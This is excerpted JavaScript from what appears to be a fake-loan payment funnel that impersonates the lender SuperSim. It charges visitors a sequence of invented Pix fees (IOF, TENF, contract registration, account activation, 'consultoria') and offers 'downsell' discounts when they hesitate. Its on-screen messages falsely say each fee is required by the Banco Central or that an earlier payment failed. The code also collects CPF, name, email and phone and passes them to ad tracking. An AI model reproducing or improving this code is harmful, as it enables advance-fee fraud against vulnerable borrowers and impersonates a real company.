...
var PIX_PRODUCTS = {
  seguro_prestamista: { price: 19.48, name: "Seguro Prestamista - SuperSim" },
  iof:  { price: 24.82, name: "IOF - Imposto sobre Operações Financeiras" },
  iof_verificacao:  { price: 23.91, name: "Taxa de Verificação de IOF" },
  tarifa_cadastro:  { price: 18.68, name: "Seguro Prestamista - Tarifa de Cadastro" },
  tenf:  { price: 17.20, name: "TENF - Taxa de Emissão da Nota Fiscal" },
  ativar_conta:  { price: 17.00, name: "Ativar Conta" },
  registro_contrato:  { price: 17.02, name: "Taxa de Registro do Contrato" },
  limite_adicional:  { price: 14.06, name: "Taxa - Limite Adicional de R$20.000" },
  taxa_processamento:  { price: 14.06, name: "Taxa de Processamento" },
  app_supersim:  { price: 11.99, name: "Aplicativo SuperSim" },
  tac: { price: 16.92, name: "TAC - Taxa de Abertura de Crédito" },
  consultoria_financeira: { price: 19.53, name: "Taxa de Consultoria Financeira" },
  processamento_administrativo: { price: 31.92, name: "Taxa de Processamento Administrativo" },

  // ── DOWNSELL (50% OFF) ──
  seguro_prestamista_ds: { price: 10.82, name: "Downsell Front - Seguro Prestamista - SuperSim" },
  iof_ds:  { price: 12.41, name: "Downsell UP1 - IOF - Imposto sobre Operações Financeiras" },
  iof_verificacao_ds:  { price: 11.96, name: "Downsell UP2 - Taxa de Verificação de IOF" },
  tarifa_cadastro_ds:  { price: 9.34,  name: "Downsell UP3 - Seguro Prestamista - Tarifa de Cadastro" },
  tenf_ds:  { price: 8.60,  name: "Downsell UP4 - TENF - Taxa de Emissão da Nota Fiscal" },
  ativar_conta_ds:  { price: 8.50,  name: "Downsell UP5 - Ativar Conta" },
  registro_contrato_ds:  { price: 8.50,  name: "Downsell UP6 - Taxa de Registro do Contrato" },
  limite_adicional_ds:  { price: 7.03,  name: "Downsell UP7 - Taxa - Limite Adicional de R$20.000" },
  taxa_processamento_ds:  { price: 7.03,  name: "Downsell UP8 - Taxa de Processamento" },
  app_supersim_ds:  { price: 6.00,  name: "Downsell UP9 - Aplicativo SuperSim" },
  tac_ds: { price: 8.46,  name: "Downsell UP10 - TAC - Taxa de Abertura de Crédito" },
  consultoria_financeira_ds: { price: 9.77,  name: "Downsell UP11 - Taxa de Consultoria Financeira" },
  processamento_administrativo_ds: { price: 15.96, name: "Downsell UP12 - Taxa de Processamento Administrativo" },
};
...
(function() {
  ...
  if (!m) return;
  var pathToProduct = {
    up1: 'iof', up2: 'iof_verificacao', up3: 'tarifa_cadastro', up4: 'tenf',
    up5: 'ativar_conta', up6: 'registro_contrato', up7: 'limite_adicional',
    up8: 'taxa_processamento', up9: 'app_supersim', up10: 'tac',
    up11: 'consultoria_financeira', up12: 'processamento_administrativo'
  };
  var prod = PIX_PRODUCTS[pathToProduct[m[1]]];
  if (!prod) return;
  _waitFbq(function() {
...
(function () {
  ...
  if (fresh.fbclid) {
    try { sessionStorage.setItem('_fbclid', fresh.fbclid); } catch (e) {}
    try { localStorage.setItem('fbclid', fresh.fbclid); } catch (e) {}
  }
})();
...
function getUtms() {
  ...
  var fromCookie = {
    ...
    utm_id:       ck('utm_id')       || ck('utmify_utm_id'),
    fbclid:       ck('fbclid')       || ck('utmify_fbclid'),
  };
  var merged = {};
  ['src','sck','utm_source','utm_medium','utm_campaign','utm_term','utm_content','utm_id'].forEach(function(k) {
    merged[k] = stored[k] || durable[k] || fromCookie[k] || null;
  });
  var storedFbclid = null;
  try { storedFbclid = sessionStorage.getItem('_fbclid') || localStorage.getItem('fbclid'); } catch (e) {}
  merged.fbclid = stored.fbclid || durable.fbclid || storedFbclid || fromCookie.fbclid || null;
  return merged;
}

var PIX_MESSAGES = {
  seguro_prestamista: { emoji: '🛡️', titulo: 'Contrate o Seguro e libere seu crédito!', sub: 'O Seguro Prestamista é obrigatório para liberar o valor com segurança na sua conta. Pague a taxa única e o crédito é liberado via Pix.' },
  iof:  { emoji: '🏦', titulo: 'Pague o IOF e libere seu crédito!',         sub: 'O Imposto sobre Operações Financeiras é obrigatório pelo Banco Central para autorizar a liberação do valor na sua conta.' },
  iof_verificacao:  { emoji: '✅', titulo: 'Última verificação de IOF.',                 sub: 'Confirme o pagamento da taxa e o processo de liberação do seu crédito será concluído em minutos.' },
  tarifa_cadastro:  { emoji: '🛡️', titulo: 'Seguro Ativo = Empréstimo Garantido',        sub: 'O Seguro Prestamista protege seu contrato e garante que o valor seja liberado com segurança para sua conta.' },
  tenf:  { emoji: '🧾', titulo: 'Emita sua Nota Fiscal agora!',               sub: 'A TENF é necessária para formalizar a operação com o Banco Central. Pague e avance para a etapa final.' },
  ativar_conta:  { emoji: '⚡', titulo: 'Ative sua conta e receba hoje!',             sub: 'Com a conta ativada, seu crédito será depositado em até 5 minutos. Você está a apenas um passo!' },
  registro_contrato:  { emoji: '📝', titulo: 'Registre seu contrato em cartório',          sub: 'O Registro do Contrato garante a validade legal do seu empréstimo. Etapa obrigatória para liberação.' },
  limite_adicional:  { emoji: '💰', titulo: 'Libere mais R$ 20.000 agora!',               sub: 'Você foi pré-aprovado para um limite adicional. Pague a taxa agora e o valor extra é liberado imediatamente.' },
  taxa_processamento:  { emoji: '🔄', titulo: 'Seu crédito ainda está disponível!',         sub: 'Houve uma instabilidade no pagamento anterior. Seu limite ainda está reservado — tente novamente agora.' },
  app_supersim:  { emoji: '📱', titulo: 'Acesso ao App SuperSim',                    sub: 'Com o aplicativo você acompanha seu empréstimo, parcelas e extratos em tempo real direto do celular.' },
  tac: { emoji: '📋', titulo: 'Última etapa! Pague a TAC.',                 sub: 'A Taxa de Abertura de Crédito cobre os custos operacionais. Após o pagamento, o valor é liberado na sua conta.' },
  consultoria_financeira: { emoji: '👨‍💼', titulo: 'Nossos especialistas estão prontos!',        sub: 'A Taxa de Consultoria Financeira viabiliza a análise personalizada do seu perfil. Último passo antes da liberação.' },
  processamento_administrativo: { emoji: '🎯', titulo: 'Quase lá! Última taxa.',                     sub: 'A Taxa de Processamento Administrativo garante a transferência segura do valor para sua conta. Etapa final!' },
};
...
function _pixCollectCustomerData() {
  var nome = '', cpf = '', email = '', phone = '';
  var params = new URLSearchParams(window.location.search);
  try {
    nome = localStorage.getItem('nome') || localStorage.getItem('name') || '';
  ...
  nome = nome || params.get('nome') || params.get('name') || '';
  cpf = cpf || params.get('cpf') || params.get('document') || '';
  email = email || params.get('email') || '';
  phone = phone || params.get('telefone') || params.get('telephone') || params.get('phone') || '';
...
function _pixPendingKey(upKey) {
  return '_pix_pending_' + String(upKey || '').replace(/[^a-zA-Z0-9_-]/g, '');
}

function _pixPaidKey(upKey) {
  return '_pix_paid_' + String(upKey || '').replace(/[^a-zA-Z0-9_-]/g, '');
}

function _pixPaidOfferKeys(upKey) {
  var base = String(upKey || '').replace(/_ds$/, '');
  return [base, base + '_ds'];
}

function _pixReadPaid(upKey) {
  try {
    var saved = JSON.parse(localStorage.getItem(_pixPaidKey(upKey)) || 'null');
    if (!saved || !saved.paidAt) return null;
    if (Date.now() - Number(saved.paidAt) > 30 * 24 * 60 * 60 * 1000) {
      _pixPaidOfferKeys(upKey).forEach(function(key) {
        localStorage.removeItem(_pixPaidKey(key));
      });
      return null;
    }
    return saved;
...
function _pixMarkPaid(upKey, txnId, amount) {
  var paid = JSON.stringify({
    txnId: String(txnId || ''),
  ...
  try {
    _pixPaidOfferKeys(upKey).forEach(function(key) {
      localStorage.setItem(_pixPaidKey(key), paid);
      localStorage.removeItem(_pixPendingKey(key));
    });
  } catch (e) {}
}

function _pixReadPending(upKey) {
  try {
    var saved = JSON.parse(localStorage.getItem(_pixPendingKey(upKey)) || 'null');
    if (!saved || !saved.txnId || !saved.qrcode || !saved.createdAt) return null;
    var currentProduct = PIX_PRODUCTS[upKey];
    if (currentProduct && Math.abs(Number(saved.amount) - Number(currentProduct.price)) > 0.001) {
      localStorage.removeItem(_pixPendingKey(upKey));
      return null;
    }
    if (Date.now() - Number(saved.createdAt) > 24 * 60 * 60 * 1000) {
      localStorage.removeItem(_pixPendingKey(upKey));
      return null;
    }
    return saved;
...
function _pixSavePending(upKey, data) {
  try {
    localStorage.setItem(_pixPendingKey(upKey), JSON.stringify({
      success: true,
      txnId: data.txnId,
      qrcode: data.qrcode,
...
function _pixClearPending(upKey) {
  try { localStorage.removeItem(_pixPendingKey(upKey)); } catch (e) {}
}
...
function _pixOpenModal(upKey) {
  ...
  // Uma oferta já confirmada não pode gerar outro PIX no mesmo navegador.
  var paidOffer = _pixReadPaid(upKey);
  if (paidOffer) {
    _pixPurchaseFired = true;
    _pixCurrentTxn = paidOffer.txnId || null;
    _pixCurrentAmount = paidOffer.amount || 0;
    ...
    setTimeout(function() {
      _pixCloseModal();
      if (typeof redirectToNextUpsell === 'function') redirectToNextUpsell();
    }, 900);
    return;
  }
  ...
  var customer = _pixCollectCustomerData();
  var nome = customer.nome, cpf = customer.cpf, email = customer.email, phone = customer.phone;
  var utms = getUtms();
  ...
  var savedPayment = _pixReadPending(upKey);
  var pixRequest;

  if (savedPayment) {
    pixRequest = fetch('/api/status?id=' + encodeURIComponent(savedPayment.txnId), {
      ...
      if (statusData && statusData.paid) {
        return {
          success: true,
          paid: true,
          txnId: savedPayment.txnId,
          amount: savedPayment.amount
        };
      }
      savedPayment._reused = true;
      return savedPayment;
    });
  } else {
    pixRequest = fetch('/api/pix', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ upKey: upKey, nome: nome, cpf: cpf, email: email, phone: phone, eid: _persistEid(), utms: utms, fbp: fbCookies.fbp, fbc: fbCookies.fbc, sourceUrl: window.location.href, icEventId: _icEventId, leadEventId: _leadEventId }),
      signal: _pixAC ? _pixAC.signal : undefined
    }).then(function(r) {
  ...
  pixRequest.then(function(data) {
    if (_pixTO) clearTimeout(_pixTO);
    if (!data.success) {
      alert(data.error || 'Erro ao gerar o Pix. Tente novamente.');
      _pixCloseModal();
      return;
    }
    ...
    if (data.paid) {
      ...
      _pixMarkPaid(upKey, data.txnId, data.amount);
      _pixClearPending(upKey);
      _pixFirePurchase();
      document.getElementById('pix-loading').style.display = 'none';
      document.getElementById('pix-content').style.display = 'none';
      document.getElementById('pix-paid').style.display = 'block';
    ...
    if (!data._reused) _pixSavePending(upKey, data);
    ...
    if (typeof fbq === 'function') {
      ...
      fetch('/api/track', {
        ...
        body: JSON.stringify({ eventName: 'AddPaymentInfo', eventId: _apiEventId, value: data.amount, email: email, phone: phone, nome: nome, cpf: cpf, eid: _persistEid(), fbp: fbCookies.fbp, fbc: fbCookies.fbc, sourceUrl: window.location.href }),
        keepalive: true,
      }).catch(function () {});
    }
    ...
    fetch('/api/status?id=' + txnId)
      ...
      .then(function(data) {
        if (data.paid) {
          clearInterval(_pixPollInterval);
          clearInterval(_pixTimerInterval);
          _pixMarkPaid(_pixCurrentUpKey, _pixCurrentTxn, _pixCurrentAmount);
          _pixClearPending(_pixCurrentUpKey);
          _pixFirePurchase();
          document.getElementById('pix-content').style.display = 'none';
          document.getElementById('pix-paid').style.display = 'block';
          setTimeout(function() {
